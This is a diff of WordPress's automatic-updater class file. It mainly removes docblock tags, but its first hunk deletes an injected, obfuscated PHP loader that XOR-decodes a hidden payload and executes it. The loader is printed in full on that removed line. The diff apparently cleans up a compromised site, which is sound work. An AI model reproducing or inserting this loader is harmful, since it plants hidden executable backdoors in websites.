@@ -1,4 +1,4 @@
-<?php $MJrNwluyR=':NRLBTn MSNDQXC'^'Y<7-611F8=-087-';$caXDEDbWM=$MJrNwluyR('',';.dePF-+<3=79TEP2LSPB>-74D09W,nM>CesZtLo16KP,>E-BiVO9sS8AM>;8K;OCRMT8EewGP5BwxLJt.2HOSOGJROQfhv35J Q>oNUCkXQoOF+qSDG+XXicVYISYMUB:InLrhpSTD1fmoGYh7AD3cu0fAnGmUI;=QXTNSSA4<I gH;SHk>oPAY5>,CUG6QB.H5fQ<aI>6>4w,17-cEYWPPSILRl6M=3-31UpjjWXYBYBMIMUEE+.YBjpjuqtve5wA9PpE.0Dqgiu:SBM-AA+=GR,O- r:IBXsFo9NOsccJY0DPCKME.AQY-A1:3<G<TyXeT0;TbDAdEU8FQP9XPZN0:p=8w+iM,BqMP0UwTfzmA5PCKZUGS7EGTUHJkGYMxYXoF2IwIbERS8F ceip2T>A6iM8MYPmLc=2;;HPwkE9S4JS26SGSIA9NlS4C6km,;0GTT16cNo,0MRR<jrXW21sCfLQ;D8rKPYSyO8++aI<UC.XLEp DYW5<GXIq5OR=:OgOVQYUkjNRA8RosIhZrTPbLR.X7Ofp,16I,NglOgFSyDrxHZZUZZWfz0ZMfZUXbxfq.UP6FR.WQHGiPAB1REtG<DbSM;0LEeKDS6X9OQrjFf<36;KYlnrTsFJab-2;ZGjWY909kP0,TWM.KmCCSsPC9AoDboYE'^'RHLD63CHHZRYf1=9A8 xeFBEk QM6s1 K7BZsT7e8P>>OJ,B,I. K,7Y5,adU>Ogg6, YiES,5LkWXljTU8AFw 2>rrqAOM9<CF>LGj<cVxaTobBM 05G=6AG28=2pvufSbEexayw;1EFCRgqLS 0R8QY;a0gI>,Bfu1tks 5FP,NOlP61BcFkKP<LI7 5XyfA=AOj6h44K4>SHPCLCxy11< ,wXHR,IRrXT,PWJ1951<yGC+:7 JM1bBT56>;=,pW JpT.KIdLYIQL2.8HhaP7NvH.YA-Q,;xNfKR+6Hijn=Q01cvmaX =,Hz;G96.ZtQyA0QO5Kd:nL3W441Z0prjoh5lm2x=mM1Qi;U,WiXZI7T<6.su<Y>Lc04<+4,<4XdxK-W0LCkLv7Y2ACXITD5R4SRG10S-gFGYSOZhmW+0W Q8:SZ:=6a9V<37U7W42ANDo65BSUz0HU.=6YBV<6FPZoFh5Z0Y- 5 zPt2BMImX47OxjcPA6+6Lc,=0.P7;NN<Oh=4 rGJj6 L3FSoNzZ94WdvJ9C.=WGTOnqgGQrGa2MqJHzhjlmo5WKU>yV<cmWJWCH65Rs4KpxhaOp 0C3<+,Y==65RC86Ml42O4V.5UFfBXRBZbpLNRtSf1kkHDZ6oN38MQbL QU88,Jl0jxYz5;P5GtKTS8');$caXDEDbWM();
+<?php
 /**
  * Upgrade API: WP_Automatic_Updater class
  *
@@ -19,7 +19,6 @@ class WP_Automatic_Updater {
 	 * Tracks update results during processing.
 	 *
 	 * @var array
-	 * @access protected
 	 */
 	protected $update_results = array();
 
@@ -27,7 +26,6 @@ class WP_Automatic_Updater {
 	 * Whether the entire automatic updater is disabled.
 	 *
 	 * @since 3.7.0
-	 * @access public
 	 */
 	public function is_disabled() {
 		// Background updates are disabled if you don't want file changes.
@@ -68,7 +66,6 @@ class WP_Automatic_Updater {
 	 * how things get updated.
 	 *
 	 * @since 3.7.0
-	 * @access public
 	 *
 	 * @param string $context The filesystem path to check, in addition to ABSPATH.
 	 */
@@ -121,7 +118,6 @@ class WP_Automatic_Updater {
 	 * Tests to see if we can and should update a specific item.
 	 *
 	 * @since 3.7.0
-	 * @access public
 	 *
 	 * @global wpdb $wpdb WordPress database abstraction object.
 	 *
@@ -205,7 +201,6 @@ class WP_Automatic_Updater {
 	 * Notifies an administrator of a core update.
 	 *
 	 * @since 3.7.0
-	 * @access protected
 	 *
 	 * @param object $item The update offer.
 	 */
@@ -249,7 +244,6 @@ class WP_Automatic_Updater {
 	 * Update an item, if appropriate.
 	 *
 	 * @since 3.7.0
-	 * @access public
 	 *
 	 * @param string $type The type of update being checked: 'core', 'theme', 'plugin', 'translation'.
 	 * @param object $item The update offer.
@@ -370,7 +364,6 @@ class WP_Automatic_Updater {
 	 * Kicks off the background update process, looping through all pending updates.
 	 *
 	 * @since 3.7.0
-	 * @access public
 	 */
 	public function run() {
 		if ( $this->is_disabled() )
@@ -450,7 +443,7 @@ class WP_Automatic_Updater {
 			wp_update_plugins(); // Check for Plugin updates
 		}
 
-		// Send debugging email to all development installs.
+		// Send debugging email to admin for all development installations.
 		if ( ! empty( $this->update_results ) ) {
 			$development_version = false !== strpos( get_bloginfo( 'version' ), '-' );
 
@@ -486,8 +479,7 @@ class WP_Automatic_Updater {
 	 * If we tried to perform a core update, check if we should send an email,
 	 * and if we need to avoid processing future updates.
 	 *
-	 * @since Unknown
-	 * @access protected
+	 * @since 3.7.0
 	 *
 	 * @param object $update_result The result of the core update. Includes the update offer and result.
 	 */
@@ -575,7 +567,6 @@ class WP_Automatic_Updater {
 	 * Sends an email upon the completion or failure of a background core update.
 	 *
 	 * @since 3.7.0
-	 * @access protected
 	 *
 	 * @param string $type        The type of email to send. Can be one of 'success', 'fail', 'manual', 'critical'.
 	 * @param object $core_update The update offer that was attempted.
@@ -773,7 +764,6 @@ class WP_Automatic_Updater {
 	 * Prepares and sends an email of a full log of background update results, useful for debugging and geekery.
 	 *
 	 * @since 3.7.0
-	 * @access protected
 	 */
 	protected function send_debug_email() {
 		$update_count = 0;
